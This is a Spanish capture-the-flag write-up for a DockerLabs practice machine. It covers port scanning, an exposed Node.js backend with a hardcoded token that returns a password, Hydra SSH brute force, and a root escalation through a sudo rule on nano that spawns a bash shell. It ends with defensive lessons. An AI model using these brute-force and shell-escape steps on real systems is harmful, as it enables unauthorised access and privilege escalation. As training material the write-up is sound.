# ConsoleLog (DockerLabs) — Writeup

Dificultad: fácil

El nombre de esta máquina es un guiño directo a cualquier desarrollador que alguna vez haya dejado un `console.log()` de depuración olvidado en producción — solo que aquí el descuido no es un simple log, sino un endpoint de API que entrega una contraseña con solo mandarle el token correcto. Alguien clonó el código del backend y se le olvidó quitar la puerta trasera de pruebas antes de desplegar.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El reto se estructura en tres tiempos: reconocimiento de una superficie algo más amplia de lo habitual (tres puertos, con el SSH en una ubicación poco convencional), lectura del código fuente de un backend en Node.js que expone una contraseña vía API con solo conocer un token trivial, y finalmente una escalada de privilegios que aprovecha una característica de `nano` poco conocida fuera de círculos de pentesting: su capacidad de ejecutar comandos externos desde dentro del propio editor.

---

## Paso 0: desplegar el laboratorio

```bash
unzip consolelog.zip
bash auto_deploy.sh consolelog.tar
```

El script de despliegue confirma la IP asignada a la máquina vulnerable y queda a la espera de que se termine la práctica para limpiar el contenedor con `Ctrl+C`.

---

## Paso 1: escaneo de puertos, y el SSH en un sitio inesperado

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

```bash
nmap -sCV -p80,3000,5000 172.17.0.2
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.61 (Debian)
3000/tcp open  http    Node.js Express framework
5000/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3
```

Tres servicios, y de entrada ya hay un detalle que rompe con la costumbre: el SSH no está en el puerto 22 de siempre, sino en el 5000. Un cambio de puerto no añade seguridad real por sí mismo —cualquier escaneo completo lo encuentra igual—, pero sí obliga a prestar atención a los detalles del escaneo en lugar de asumir configuraciones por defecto.

El puerto 3000 llama la atención por otro motivo: Nmap lo identifica directamente como un framework Express de Node.js. Esa es información valiosísima — Express es de los frameworks de backend más usados en JavaScript, y si hay una API corriendo ahí, seguramente tenga rutas y lógica de negocio interesantes de inspeccionar.

---

## Paso 2: la web del puerto 80 parece normal... hasta el fuzzing

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100 -k -r
```

```
/backend      (Status: 200) [Size: 1563]
/index.html   (Status: 200) [Size: 234]
```

Entre los directorios encontrados, `/backend` destaca de inmediato por el nombre. Dentro aparece un archivo `server.js` — el propio código fuente del backend en Node.js, expuesto tal cual en texto plano.

---

## Paso 3: leyendo el código fuente que nunca debió estar accesible

```javascript
const express = require('express');
const app = express();
const port = 3000;

app.use(express.json());

app.post('/recurso/', (req, res) => {
    const token = req.body.token;
    if (token === 'tokentraviesito') {
        res.send('lapassworddebackupmaschingonadetodas');
    } else {
        res.status(401).send('Unauthorized');
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Backend listening at http://consolelog.lab:${port}`);
});
```

Este archivo lo cuenta absolutamente todo: existe un endpoint que, al recibir una petición POST con un token concreto, responde directamente con lo que parece ser una contraseña de respaldo. El "token secreto" no es más que una cadena estática hardcodeada en el propio código — cualquiera que lea este archivo (que, recordemos, estaba accesible públicamente) tiene la clave de entrada sin necesidad de adivinar nada ni interceptar tráfico.

En un entorno real, este archivo jamás debería servirse tal cual desde el servidor web — el código fuente de un backend no tiene ningún motivo legítimo para estar expuesto en una ruta accesible al público.

---

## Paso 4: descubriendo a qué usuario pertenece la contraseña filtrada

La contraseña en sí (`lapassworddebackupmaschingonadetodas`) es evidente por lo del nombre, pero falta saber a qué usuario del sistema corresponde. Con SSH corriendo en el puerto 5000, toca combinar un diccionario de usuarios comunes con esa única contraseña ya conocida:

```bash
hydra -L usuarios.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2 -s 5000 -t 64 -I
```

```
[5000][ssh] host: 172.17.0.2   login: lovely   password: lapassworddebackupmaschingonadetodas
```

El usuario **lovely** encaja con la contraseña filtrada por el backend. Con las credenciales completas:

```bash
ssh lovely@172.17.0.2 -p 5000
```

Acceso conseguido.

---

## Paso 5: escalada — nano, el editor "inofensivo" que también sabe abrir shells

```bash
sudo -l
```

```
User lovely may run the following commands on 1db80b165ab8:
    (ALL) NOPASSWD: /usr/bin/nano
```

Nano tiene fama de ser el editor "sencillo" frente a la complejidad de vim, pero comparte exactamente el mismo problema de fondo cuando se concede vía sudo sin restricciones: permite ejecutar comandos externos desde dentro de su propia interfaz. La combinación de teclas para esto es menos conocida que el `:shell` de vim, pero funciona de forma equivalente.

```bash
sudo nano
```

Dentro del editor, se usa la combinación **Ctrl+R** (leer archivo) seguida de **Ctrl+X** (ejecutar comando externo en vez de leer un archivo), lo cual abre un prompt de comando dentro de nano:

```
^R^X
reset; bash 1>&0 2>&0
```

El comando introducido reinicia la terminal y lanza una bash heredando los descriptores de entrada y salida estándar del proceso — en este caso, con privilegios de root, dado que nano se ejecutó vía sudo.

```bash
whoami
# root
```

Root conseguido.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Servicios expuestos | Apache (80), Express/Node.js (3000), SSH en puerto no estándar (5000) |
| Filtración clave | Código fuente `server.js` accesible en `/backend` |
| Vector de credenciales | Token hardcodeado en la API → contraseña de respaldo |
| Usuario obtenido | lovely, vía Hydra con contraseña ya conocida |
| Vector de escalada | `sudo NOPASSWD` sobre `/usr/bin/nano` (Ctrl+R Ctrl+X) |
| Resultado final | root, sin necesidad de contraseña adicional |

---

## Qué falló aquí (y cómo se evita)

1. **Código fuente del backend accesible públicamente.** El archivo `server.js` nunca debería haber estado en una ruta servida por el servidor web. El código de una aplicación debe vivir fuera de la raíz pública, o al menos protegido con reglas explícitas que impidan su descarga directa.
2. **Credenciales hardcodeadas directamente en el código fuente.** Tanto el token de autenticación como la contraseña que ese endpoint entrega estaban escritos literalmente en el archivo. Cualquier secreto de este tipo debería vivir en variables de entorno o en un gestor de secretos, nunca en el propio repositorio de código.
3. **Un endpoint de API que entrega contraseñas sin ningún control adicional.** Más allá del token trivial, la idea misma de tener una ruta que responde con una contraseña en texto plano es un diseño peligroso por definición, independientemente de lo compleja que sea la validación previa.
4. **Regla de sudo NOPASSWD sobre un editor de texto.** Igual que en otras máquinas de esta misma colección, cualquier editor con capacidad de invocar comandos externos (nano, vim, emacs, y una larga lista más) equivale a una vía directa hacia una shell con los privilegios que sudo le conceda. La única defensa real es no otorgar ese permiso en absoluto.

---

## Referencias

- GTFOBins — nano: https://gtfobins.github.io/gtfobins/nano/
- THC Hydra: https://github.com/vanhauser-thc/thc-hydra
- DockerLabs: https://dockerlabs.es/
